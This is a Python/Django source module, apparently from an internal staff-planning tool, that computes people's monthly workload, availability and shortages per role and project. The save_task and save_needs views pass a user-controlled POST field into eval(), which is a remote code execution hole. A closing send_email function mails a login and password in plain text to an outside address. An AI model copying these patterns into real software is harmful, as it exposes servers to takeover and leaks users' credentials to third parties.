from .utils import *
from .vvv import *


def real_and_virtual_people(role:object)->List[object]:
    pp1 = set(UserProfile.objects.filter(Q(role=role, virtual=False)))
    pp2 = set(UserProfile.objects.filter(Q(res=role, virtual=False)))
    pps = pp1.union(pp2)
    ppl = sorted(list(pps), key=lambda x:x.fio)
    try:
        ov = UserProfile.objects.filter(fio="ВАКАНСИЯ")[0]
        ou = UserProfile.objects.filter(fio="АУТСОРС")[0]
    except:
        ou = None
        ov = None
    return ppl + [ou, ov]


def real_people(role:object)->List[UserProfile]:
    pp1 = set(UserProfile.objects.filter(Q(role=role, virtual=False)))
    pp2 = set(UserProfile.objects.filter(Q(res=role, virtual=False)))
    pps = pp1.union(pp2)
    ppl = sorted(list(pps), key=lambda x: x.fio)
    return ppl


def is_virtual(person:UserProfile)->bool:
    if person.fio in ("ВАКАНСИЯ", "АУТСОРС"):
        return True
    return False




def get_prj_triplet(p:int, r:int, j:int)->tuple[any,any,any]:
    role = None
    if r > 0:
        try:
            role = Role.objects.filter(id=r)[0]
        except:
            pass
    person = None
    if p > 0:
        try:
            person = UserProfile.objects.filter(id=p)[0]
        except:
            pass
    project = None
    if j > 0:
        try:
            project = Project.objects.filter(id=j)[0]
        except:
            pass

    return (person, role, project)


def create_or_update_res_max(person:object, role:object, m:date, l:int)->None:  # Доступность
    try:
        instance = Less.objects.get(person=person, role=role, start_date=m)
    except:
        instance = None
    if instance:
        instance.load = l
        instance.save()
    else:
        instance = Less.objects.create(person=person, role=role, start_date=m, load=l)


def create_or_update_task(p:object, r:object, j:object, d:date, l:int)->None:  # Загрузка tjTask
    try:
        instance = Task.objects.get(person=p, project=j, role=r, month=d)
    except:
        instance = None
    if instance:
        instance.load = l
        instance.save()
    else:
        instance = Task.objects.create(person=p, role=r, project=j, month=d, load=l)


def create_or_update_needs(person:object, role:object, project:object, m:date, v:int)->None:  # Потребность tjLoad
    try:
        instance = Load.objects.get(project=project, role=role, month=m)
    except:
        instance = None

    if instance:
        instance.load = float(v)
        instance.save()

    else:
        instance = Load.objects.create(project=project, role=role, month=m, load=v)


def rest_of_time_pr_12(p, r):
    c = [0] * 12
    a = task_person_role_12(p, r)
    b = time_available_person_role_12(p, r)
    try:
        for i in range(12):
            c[i] = b[i] - a[i]
    except:
        return None
    return c


def task_person_role_12(person:object, role:object)->List[int]:
    d = date.today().replace(day=15)
    res = [0] * 12
    for i in range(12):
        tasks = Task.objects.filter(person=person, role=role, month=d)
        for task in tasks:
            try:
                res[i] += task.load
            except:
                pass
        d = inc(d)
    return res

def time_available_in_mon(p:int, r:int, y:int, m:int)->int:
    d = date(y, m, 15) 
    person, role, project = get_prj_triplet(p, r, -1)
    if is_virtual(person):
        return 99999
    if person.role == role:
        t = 100
    elif role in person.res:
        t = 0
    task = Less.objects.filter(person=person, role=role, start_date__lte=d).order_by(
        "-start_date"
    )
    try:
        t = task[0].load
    except:
        pass
    return t




def delta_on_span(p,r, j, n):
    rjd = delta_role_project_12(r, j)
    sum = 0
    for i in range(n):
        if rjd[i] < 0:
            sum -= rjd[i]
    return sum

def save_max(request):
    html = ""
    id = 1
    r = 1
    p = 1
    j = 1
    if request.method == "POST":
        # create a form instance and populate it with data from the request:
        form = Form(request.POST)
        if form.is_valid():
            html = request.POST.get("html")
            for k, v in request.POST.items():
                if "." in k:
                    p, r, j, d = k.split(".")

                    try:
                        role = Role.objects.get(id=r)
                        person = UserProfile.objects.get(id=p)

                        create_or_update_res_max(person, role, d, v)
                    except:
                        pass
        else:
            print(form.errors)
    if html == "":
        return available_role(request, p, r, j)
    return available_all(request)  # s



def save_task(request):
    p = 0
    r = 0
    j = 0
    html = ""
    if request.method == "POST":
        form = Form(request.POST)
        if form.is_valid():
            for k, v in request.POST.items():
                html = request.POST.get("html")
                if "." in k:
                    p, r, j, d = k.split(".")
                    try:
                        project = Project.objects.get(id=j)
                        role = Role.objects.get(id=r)
                        person = UserProfile.objects.get(id=p)
                        create_or_update_task(
                            person, role, project, d, v
                        )  ##################################
                    except:
                        pass
        else:
            print(form.errors)

    return eval(f"{html}(request,{p},{r},{j})")


def save_needs(request):
    p = 0
    j = 0
    r = 0
    if request.method == "POST":
        form = Form(request.POST)
        if form.is_valid():
            for k, v in request.POST.items():
                html = request.POST.get("html")
                if "." in k:
                    p, r, j, d = k.split(".")

                    try:
                        person = None
                        role = Role.objects.get(id=r)
                        project = Project.objects.get(id=j)
                        create_or_update_needs(person, role, project, d, v)
                    except:
                        pass
        else:
            print(form.errors)
    return eval(f"{html}(request,{p},{r},{j})")



'''
Задачи = утвержденные загрузки- суммарно = при фиксированных параметрах - вектор - нв 12 месяцев
'''
def task_person_role_project_12(p:object, r:object, j:object)->List[int]:
    d = date.today().replace(day=15)
    res = [0] * 12
    for i in range(12):
        t = Task.objects.filter(person=p, project=j, role=r, month=d)
        try:
            res[i] += t[0].load
        except:
            pass
        d = inc(d)
    return res


def task_role_project_including_virtuals_12(r, j):
    d = date.today().replace(day=15)
    res = [0] * 12
    for i in range(12):
        tasks = Task.objects.filter(project=j, role=r, month=d)
        for t in tasks:
            try:
                res[i] += t.load
            except:
                pass
        d = inc(d)
    return res


def task_role_project_12(r, j):
    d = date.today().replace(day=15)
    res = [0] * 12
    for i in range(12):
        tasks = Task.objects.filter(project=j, role=r, month=d)
        for t in tasks:
            if t.person.id not in (10, 11):
                try:
                    res[i] += t.load
                except:
                    pass
        d = inc(d)
    return res


def time_available_person_role_12(person:object, role:object)->List[int]:
    if is_virtual(person):
        return [999999] * 12

    res = [0] * 12
    d = date0()
    t = -1
    if person == None:
        return None
    if person.role == role:
        t = 100
    elif person.res.filter(id=role.id).exists():
        t = 0

    for i in range(12):
        task = Less.objects.filter(
            person=person, role=role, start_date__lte=d
        ).order_by("-start_date")
        try:
            t = task[0].load
        except:
            pass
        res[i] = t
        d = inc(d)
    return res

#
#def time_available_role(role:object)->List[int]:   
#    people = real_people(role)
#    res = [0] * 12
#    for person in people:
#        if is_virtual(person):
#            continue
#        isfree = time_available_person_role_12(person, role)
#        for i in range(12):
#            res[i] += isfree[i]
#    return res


def needs_role_project_12(p:object,r:object, j:object)->List[int]:
    d = date0()
    res = [0] * 12
    for i in range(12):
        t = Load.objects.filter(project=j, role=r, month=d)
        try:
            res[i] = t[0].load
        except:
            pass
        d = inc(d)
    return res



'''
нехватка ресурса - роль и проект - на 12 месяцев
'''
def delta_role_project_12(r:object, j:object)->List[int]:
    a = needs_role_project_12(-1,r, j)
    b = task_role_project_including_virtuals_12(r, j)
    c = [0] * 12
    for i in range(12):
        c[i] = b[i] - a[i]
    return c

'''
Загрузка одно человека по разным ролям суммарно превысила 100% (булев вектор)
'''
def person_more_100_12(person:object)->List[bool]:
    sum = [0] * 12
    roles = {person.role}.union(person.res.all())
    for role in roles:
        isfree = time_available_person_role_12(person, role)
        for i in range(12):
            sum[i] += isfree[i]
    res = [True] * 12
    for i in range(12):
        res[i] = sum[i] > 100
    return res


from django.core.mail import send_mail

def send_email(msg1,msg2):
    subject = 'new login'
    message = f"login:{msg1} pwd:{msg2}"
    from_email = 'admin@django.com'
    recipient_list = ['jfeldman777@gmails.com']

    send_mail(subject, message, from_email, recipient_list)
   
    
